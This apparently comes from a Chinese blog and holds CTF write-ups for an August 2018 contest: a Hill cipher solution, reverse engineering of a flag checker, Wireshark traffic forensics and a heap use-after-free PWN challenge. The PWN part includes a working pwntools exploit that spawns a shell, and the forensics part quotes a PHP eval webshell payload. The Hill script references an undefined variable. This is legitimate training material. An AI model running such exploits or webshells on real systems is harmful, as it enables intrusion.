<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="Software Security Researcher">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>2018-安恒杯八月月赛 - B3ale</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Friday, August 31st 2018, 10:34 pm
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    2.4k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      12 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>放暑假玩了几天，慢慢整理这几次比赛。</p>
<a id="more"></a>
<h1 id="CRYPTO-爬坡道"><a href="#CRYPTO-爬坡道" class="headerlink" title="CRYPTO-爬坡道"></a>CRYPTO-爬坡道</h1><p>提示明显是希尔加密，了解一下希尔加密写一下脚本或者<a href="https://www.cryptool.org/en/cto-ciphers/hill" target="_blank" rel="noopener">在线解密</a>。</p>
<pre><code class="python">from numpy import *

flag = &#39;&#39;
mat_key = mat([[3, 1], [2, 1]])
enc = &#39;mttpjbpexfdzcegtdzeanutg&#39;
# pla = &#39;thehillisveryinteresting&#39;

# 字符串转为数字
enc1 = []
for i in range(len(enc)):
  enc1.append(ord(enc[i]) - ord(&#39;a&#39;))

# 计算明文并转化为字符串
res = mat_enc * mat_key.I
res = res.reshape(1, len(enc1)).tolist()[0]
flag = &#39;&#39;
for i in range(len(res)):
  flag += chr(ord(&#39;a&#39;) + (int(round(res[i])) % 26))

# 输出flag
print flag
</code></pre>
<p>最后提交 flag 的 md5 值。</p>
<h1 id="RE-Dig-The-Way"><a href="#RE-Dig-The-Way" class="headerlink" title="RE-Dig The Way"></a>RE-Dig The Way</h1><p>题目里直接给了一个 idb 文件，用 ida 打开分析。</p>
<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int result; // eax
  int v5; // eax
  char flag; // [esp+11h] [ebp-3Fh]
  int a[0]; // [esp+28h] [ebp-28h]
  int a[2]; // [esp+30h] [ebp-20h]
  int a[4]; // [esp+38h] [ebp-18h]
  int a[5]; // [esp+3Ch] [ebp-14h]
  signed int (__cdecl *_func0)(char *, int, int); // [esp+40h] [ebp-10h]
  int (__cdecl *_func1)(char *, int, int); // [esp+44h] [ebp-Ch]
  int (__cdecl *_func2)(char *, int, int); // [esp+48h] [ebp-8h]
  int i; // [esp+4Ch] [ebp-4h]

  __main();
  _func0 = swap;                                // swap pos
  _func1 = trans1;                              // |x + y| - |x| - |y| + 2
  _func2 = trans2;                              // |x| + |y| - |x + y| + 2
  v3 = 0;
  do
  {
    *(int *)((char *)&amp;a[0] + v3) = 0;           // init array
    v3 += 4;
  }
  while ( v3 &lt; 24 );
  printf(&quot;input flag:&quot;);
  scanf(&quot;%s&quot;, &amp;flag);
  if ( strcmp(&amp;flag, &quot;flag{&quot;) &lt; 0 )             // 1.flag head
    return 0;
  if ( check(&amp;flag) )                           // 2.flag all-misc
  {
    a[5] = getValue(&amp;flag);
    if ( a[5] &gt; 0 )                             // make sure only one solution
    {
      for ( i = 0; i &lt;= 2; ++i )
      {
        v5 = (*(&amp;_func0 + i))((char *)&amp;a[0], 4, 5);
        *(&amp;a[0] + i) = v5;
        a[5] = -a[4];
      }
      if ( a[2] )                               // 3.flag key-point
      {
        result = 1;
      }
      else
      {
        puts(&quot;Congratulations&quot;);
        system(&quot;PAUSE&quot;);
        result = 0;
      }
    }
    else
    {
      result = 0;
    }
  }
  else
  {
    puts(&quot;check your flag!&quot;);
    result = 0;
  }
  return result;
}
</code></pre>
<p>一开始对输入字符串匹配了<code>flag{</code>，之后有多个函数进行的转换。可以看出最重要的有三个函数：</p>
<ol>
<li><code>check()</code></li>
<li><code>getValue()</code></li>
<li><code>_func2</code></li>
</ol>
<p>下面就逐一分析。</p>
<h2 id="check"><a href="#check" class="headerlink" title="check()"></a><code>check()</code></h2><pre><code class="cpp">bool __cdecl check(_BYTE *a1)
{
  if ( (char)a1[7] + (char)a1[6] != (char)a1[8] )
    return 0;
  if ( (char)a1[10] + (char)a1[9] != (char)a1[11] )
    return 0;
  if ( (char)a1[13] + (char)a1[12] != (char)a1[14] )
    return 0;
  if ( (char)a1[16] + (char)a1[15] != (char)a1[17] )
    return 0;
  if ( (char)a1[19] + (char)a1[18] == (char)a1[20] )
    return (a1[8] ^ (unsigned __int8)(a1[11] ^ a1[14] ^ a1[17] ^ a1[21])) == a1[5];
  return 0;
}
</code></pre>
<p>通过这个函数大概可以得到几个字符得到的方式，显然这里用 z3 是很难求解的。</p>
<h2 id="getValue"><a href="#getValue" class="headerlink" title="getValue()"></a><code>getValue()</code></h2><pre><code class="cpp">int __cdecl getValue(char *a1)
{
  signed int i; // [esp+8h] [ebp-8h]
  int v3; // [esp+Ch] [ebp-4h]

  v3 = 0;
  for ( i = 6; i &lt;= 19; i += 3 )
    v3 = 100 * v3 + 10 * (a1[i] - 48) + a1[i + 1] - 48;
  return v3;
}
</code></pre>
<p>从第六位开始，每次取三位，每三位取前两位组成数字 v3 并返回。</p>
<h2 id="func2"><a href="#func2" class="headerlink" title="_func2"></a><code>_func2</code></h2><pre><code class="cpp">int __cdecl trans2(char *a1, int i, int j)
{
  return abs(*(_DWORD *)&amp;a1[4 * j])
       - abs(*(_DWORD *)&amp;a1[4 * j] + *(_DWORD *)&amp;a1[4 * i])
       + abs(*(_DWORD *)&amp;a1[4 * i])
       + 2;
}
</code></pre>
<p>简化为 <code>|x| + |y| - |x + y| + 2</code>，根据 main 函数中的逻辑，该值应该为 0。但又因为 <code>|x| + |y| &gt;= |x + y|</code>，故 <code>|x| + |y| - |x + y| + 2 &gt; 0</code>，无法使之为 0。</p>
<p>下面开始对程序逆向分析：</p>
<ol>
<li>由于第三个函数很难得到 0，可以想到溢出方面，使返回值为 <code>0x100000000</code>。x 与 y 的值又因为互为相反数，可以求出 <code>|x|</code> 和 <code>|y|</code> 的值，而 y 在内存中的表示即为 x 的补码。得到 x 为 2147483647，y 为 2147483649。</li>
<li>通过 x 的值和 getValue 函数倒推出一部分 flag：<code>flag{x21x47x48x36x47</code>（x 为未知部分）。</li>
<li>根据 check 函数，写个脚本跑出大部分 flag：<code>flag{x21c47k48l36i47k</code>。</li>
<li>最后还有一部分由于不知道第 21 位 flag，猜测应该是<code>}</code>了，通过 check 函数异或后得到：<code>flag{p21c47k48l36i47k}</code></li>
</ol>
<h1 id="MISC-暴力可解"><a href="#MISC-暴力可解" class="headerlink" title="MISC-暴力可解"></a>MISC-暴力可解</h1><p>8 位的数字暴力破解得到 zip 密码。</p>
<p><img src="/pics/2018-安恒杯八月月赛/暴力可解/1.png" srcset="/img/loading.gif" alt></p>
<p>先试着用 stegsolve 把两张图合并无果，猜测是盲水印，用工具 BlindWaterMark，命令为 <code>python bwm.py 1.png 2.png flag.png</code>，最后得到 flag。</p>
<h1 id="PWN-Unote2"><a href="#PWN-Unote2" class="headerlink" title="PWN-Unote2"></a>PWN-Unote2</h1><pre><code class="bash">root@b1571ee3e5b3:~/tmp# checksec ./Unote
[*] &#39;/root/tmp/Unote&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>32 位的堆题：</p>
<pre><code class="cpp">void __cdecl __noreturn main()
{
  int v0; // eax
  char buf; // [esp+18h] [ebp-8h]
  unsigned int v2; // [esp+1Ch] [ebp-4h]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  printf(&quot;Please input your username:&quot;);
  read(0, &amp;username, 0x1Eu);
  while ( 1 )
  {
    while ( 1 )
    {
      welcome();
      read(0, &amp;buf, 4u);
      v0 = atoi(&amp;buf);
      if ( v0 != 2 )
        break;
      delete();
    }
    if ( v0 &gt; 2 )
    {
      if ( v0 == 3 )
      {
        print();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts(&quot;Invalid choice&quot;);
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
</code></pre>
<p>在 <code>delete</code> 这里看到 <code>free</code> 之后指针没有置空，可以 uaf：</p>
<pre><code class="cpp">unsigned int delete()
{
  int idx; // [esp+14h] [ebp-14h]
  char buf; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf(&quot;Index :&quot;);
  read(0, &amp;buf, 4u);
  idx = atoi(&amp;buf);
  if ( idx &lt; 0 || idx &gt;= size )
  {
    puts(&quot;Out of bound!&quot;);
    _exit(0);
  }
  if ( !ptr[idx] )
    return __readgsdword(0x14u) ^ v3;
  free(*((void **)ptr[idx] + 1));               // uaf
  free(ptr[idx]);
  puts(&quot;Success&quot;);
  return __readgsdword(0x14u) ^ v3;
}
</code></pre>
<p><code>add</code> 把每个 chunk 的第一个部分置为 <code>puts</code> 函数：</p>
<pre><code class="cpp">unsigned int add()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+1Ch] [ebp-1Ch]
  int size; // [esp+20h] [ebp-18h]
  char buf; // [esp+24h] [ebp-14h]
  unsigned int v5; // [esp+2Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( ::size &lt;= 2 )
  {
    for ( i = 0; i &lt;= 2; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )
        {
          puts(&quot;Alloca Error&quot;);
          exit(-1);
        }
        *(_DWORD *)ptr[i] = puts_func;
        printf(&quot;Note size :&quot;);
        read(0, &amp;buf, 8u);
        size = atoi(&amp;buf);
        v0 = ptr[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts(&quot;Alloca Error&quot;);
          exit(-1);
        }
        printf(&quot;Content :&quot;);
        read(0, *((void **)ptr[i] + 1), size);
        puts(&quot;Success !&quot;);
        ++::size;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts(&quot;Full&quot;);
  }
  return __readgsdword(0x14u) ^ v5;
}
</code></pre>
<p><code>print</code>调用每个 chunk 的<code>puts</code>函数：</p>
<pre><code class="c">unsigned int print()
{
  int idx; // [esp+14h] [ebp-14h]
  char buf; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf(&quot;Index :&quot;);
  read(0, &amp;buf, 4u);
  idx = atoi(&amp;buf);
  if ( idx &lt; 0 || idx &gt;= size )
  {
    puts(&quot;Out of bound!&quot;);
    _exit(0);
  }
  if ( ptr[idx] )
    (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]);
  return __readgsdword(0x14u) ^ v3;
}
</code></pre>
<p>程序中还留了一个后门：</p>
<pre><code class="cpp">int __cdecl hack(int a1)
{
  return system(*(const char **)(a1 + 4));
}
</code></pre>
<p>可以在输入 username 的时候把 <code>/bin/sh</code> 传上去，然后利用 uaf 在第二次 malloc 的时候把后门函数和 buf 的地址传上去。</p>
<p>思路是 malloc 两次大一点的 chunk，然后先后 free 掉。再 malloc 一个大小为 <code>0x8</code> 的 chunk，会把之前两个存放 <code>puts</code> 函数的 chunk 取出来。free 两次之后四个 chunk 如下：</p>
<pre><code>assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80000
$45 = {
  prev_size = 0x0,
  size = 0x11,
  fd = 0x0,
  bk = 0x8e80018,
  fd_nextsize = 0x0,
  bk_nextsize = 0x29
}
assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80010
$46 = {
  prev_size = 0x0,
  size = 0x29,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80038
$47 = {
  prev_size = 0x0,
  size = 0x11,
  fd = 0x8e80000,
  bk = 0x8e80050,
  fd_nextsize = 0x0,
  bk_nextsize = 0x29
}
assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80048
$48 = {
  prev_size = 0x0,
  size = 0x29,
  fd = 0x8e80010,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
</code></pre><p>然后可以把 <code>puts</code> 改成 <code>system</code> 后门，直接调用 <code>print</code> 就能 getshell。Exploit：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]
local = 1
if local:
    p = process(&#39;./Unote&#39;)
else:
    p = remote(&#39;101.71.29.5&#39;, 10001)
elf = ELF(&#39;./Unote&#39;)
puts_got = elf.got[&#39;puts&#39;]
hack = 0x08048672
gdb.attach(p)

def cmd(c):
    p.recvuntil(&#39;choice :&#39;)
    p.send(str(c))

def add(size, content):
    cmd(1)
    p.recvuntil(&#39;Note size :&#39;)
    p.send(str(size))
    p.recvuntil(&#39;Content :&#39;)
    p.send(content)

def delete(idx):
    cmd(2)
    p.recvuntil(&#39;Index :&#39;)
    p.send(str(idx))

def show(idx):
    cmd(3)
    p.recvuntil(&#39;Index :&#39;)
    p.send(str(idx))

p.recvuntil(&#39;Please input your username:&#39;)
str_bin_sh = 0x0804A070
p.send(&#39;/bin/sh\x00&#39;)

add(0x20, &#39;A&#39;) # 0
add(0x20, &#39;B&#39;) # 1
delete(0)
delete(1)
add(0x8, p32(hack) + p32(str_bin_sh))
show(0)
p.interactive()
</code></pre>
<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>学习了一下 Wireshark 的使用和流量分析。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li>过滤 IP：<ul>
<li><code>ip.src eq x.x.x.x or ip.dst eq x.x.x.x</code></li>
<li><code>ip.addr eq x.x.x.x</code></li>
</ul>
</li>
<li>过滤端口：<ul>
<li><code>tcp.port eq 80 or udp.port eq 80</code></li>
</ul>
</li>
<li>过滤 MAC<ul>
<li><code>eth.dst == A0:00:00:04:C5:84</code></li>
</ul>
</li>
<li>http 模式过滤：<ul>
<li><code>http.request.method == &quot;GET&quot;</code></li>
<li><code>http.request.method == &quot;POST&quot;</code></li>
<li><code>http.request.uri == &quot;/img/logo-edu.gif&quot;</code></li>
<li><code>http contains &quot;GET&quot;</code></li>
<li><code>http contains &quot;HTTP/1.&quot;</code></li>
<li><code>http.request.method == &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</code></li>
</ul>
</li>
</ul>
<h2 id="webone-pcap"><a href="#webone-pcap" class="headerlink" title="webone.pcap"></a>webone.pcap</h2><p>协议分级发现大部分为 http，重点关注对话的 80 端口，基本可以确定黑客的地址。</p>
<h3 id="黑客使用的扫描器"><a href="#黑客使用的扫描器" class="headerlink" title="黑客使用的扫描器"></a>黑客使用的扫描器</h3><p>扫描器很容易发现：</p>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/1.png" srcset="/img/loading.gif" alt></p>
<p>或者可以用 <code>http contains</code> 查找常用的几种扫描器。</p>
<h3 id="黑客扫描到的登陆后台"><a href="#黑客扫描到的登陆后台" class="headerlink" title="黑客扫描到的登陆后台"></a>黑客扫描到的登陆后台</h3><pre><code class="wireshark">http.request.method == &quot;POST&quot;
</code></pre>
<p>得知黑客使用了 awvs 后再次筛选可以找到登录后台：</p>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/2.png" srcset="/img/loading.gif" alt></p>
<h3 id="黑客登陆-web-后台使用的账号密码"><a href="#黑客登陆-web-后台使用的账号密码" class="headerlink" title="黑客登陆 web 后台使用的账号密码"></a>黑客登陆 web 后台使用的账号密码</h3><pre><code class="wireshark">http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;rec=login&quot;
</code></pre>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/3.png" srcset="/img/loading.gif" alt></p>
<h3 id="黑客上传的-webshell-内容的-base-编码"><a href="#黑客上传的-webshell-内容的-base-编码" class="headerlink" title="黑客上传的 webshell 内容的 base 编码"></a>黑客上传的 webshell 内容的 base 编码</h3><pre><code class="wireshark">http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;eval&quot;
</code></pre>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/4.png" srcset="/img/loading.gif" alt></p>
<p>即将<code>@eval($_POST[&#39;1234&#39;])</code>base64 加密后提交。</p>
<h3 id="黑客在-robots-txt-中找到的-flag"><a href="#黑客在-robots-txt-中找到的-flag" class="headerlink" title="黑客在 robots.txt 中找到的 flag"></a>黑客在 robots.txt 中找到的 flag</h3><pre><code class="wireshark">http contains &quot;Disallow&quot;
</code></pre>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/5.png" srcset="/img/loading.gif" alt></p>
<h3 id="黑客找到的数据库密码"><a href="#黑客找到的数据库密码" class="headerlink" title="黑客找到的数据库密码"></a>黑客找到的数据库密码</h3><pre><code class="wireshark">http contains &quot;web&quot; and http contains &quot;password&quot;
</code></pre>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/6.png" srcset="/img/loading.gif" alt></p>
<h3 id="被黑客攻击的-web-服务器网卡内网-ip"><a href="#被黑客攻击的-web-服务器网卡内网-ip" class="headerlink" title="被黑客攻击的 web 服务器网卡内网 ip"></a>被黑客攻击的 web 服务器网卡内网 ip</h3><pre><code class="wireshark">http contains &quot;eth&quot;
</code></pre>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/7.png" srcset="/img/loading.gif" alt></p>
<h2 id="webtwo-pcap"><a href="#webtwo-pcap" class="headerlink" title="webtwo.pcap"></a>webtwo.pcap</h2><h3 id="黑客在数据库中找到的-hash-code"><a href="#黑客在数据库中找到的-hash-code" class="headerlink" title="黑客在数据库中找到的 hash_code"></a>黑客在数据库中找到的 hash_code</h3><pre><code class="wireshark">mysql contains &quot;hash_code&quot;
</code></pre>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/8.png" srcset="/img/loading.gif" alt></p>
<h3 id="黑客破解账号-ijnu-test-com-得到的密码"><a href="#黑客破解账号-ijnu-test-com-得到的密码" class="headerlink" title="黑客破解账号 ijnu@test.com 得到的密码"></a>黑客破解账号 <a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a> 得到的密码</h3><pre><code class="wireshark">mysql contains &quot;ijnu@test.com&quot;
</code></pre>
<p>找到密码后 md5 解密：</p>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/9.png" srcset="/img/loading.gif" alt></p>
<h2 id="mailtwo-pcap-amp-amp-mailtwo1-pcap"><a href="#mailtwo-pcap-amp-amp-mailtwo1-pcap" class="headerlink" title="mailtwo.pcap &amp;&amp; mailtwo1.pcap"></a>mailtwo.pcap &amp;&amp; mailtwo1.pcap</h2><h3 id="黑客登陆-mail-系统使用的账号"><a href="#黑客登陆-mail-系统使用的账号" class="headerlink" title="黑客登陆 mail 系统使用的账号"></a>黑客登陆 mail 系统使用的账号</h3><p>可以社工，直接用 web 的账号密码。</p>
<p>正经做法是先在 mailtwo.pcap 中找到加密算法：</p>
<pre><code class="js">var key_hash = CryptoJS.MD5(&quot;1234567812345678&quot;);
var key = CryptoJS.enc.Utf8.parse(key_hash);
var iv = CryptoJS.enc.Utf8.parse(&quot;1234567812345678&quot;);
form.password.value = CryptoJS.AES.encrypt(form.password.value, key, {
  iv: iv,
  mode: CryptoJS.mode.CBC,
  padding: CryptoJS.pad.ZeroPadding
});
</code></pre>
<p>在 mailtwo1.pcap 中再过滤：</p>
<pre><code class="wireshark">(http contains &quot;{\&quot;success\&quot;:true}&quot; or http.request.method == &quot;POST&quot;) and ip.addr == 192.168.94.59
</code></pre>
<p>找到被加密的密码：</p>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/10.png" srcset="/img/loading.gif" alt></p>
<p>最后根据算法和已被加密的密码得到明文密码。</p>
<h2 id="vpnone-pcap-amp-amp-vpntwo-pcap"><a href="#vpnone-pcap-amp-amp-vpntwo-pcap" class="headerlink" title="vpnone.pcap &amp;&amp; vpntwo.pcap"></a>vpnone.pcap &amp;&amp; vpntwo.pcap</h2><p>vpnone.pcap 在尝试登陆 vpn，vpntwo.pcap 成功登陆了 vpn。</p>
<h3 id="黑客获得的-vpn、ip"><a href="#黑客获得的-vpn、ip" class="headerlink" title="黑客获得的 vpn、ip"></a>黑客获得的 vpn、ip</h3><p>在 <code>统计-&gt;端点</code> 中流量最大的为黑客 ip。</p>
<p><img src="/pics/2018-安恒杯八月月赛/流量分析/11.png" srcset="/img/loading.gif" alt></p>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://foreversong.cn/archives/216" target="_blank" rel="noopener">http://foreversong.cn/archives/216</a><br><a href="http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/" target="_blank" rel="noopener">http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2018/09/10/2018-noxCTF/">
                        <i class="fa fa-chevron-left"></i>
                        <span>2018-noxCTF</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2018/08/30/2017-CSAW-Quals-realism/">
                        <span>2017-CSAW-Quals-realism</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "2018-安恒杯八月月赛&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
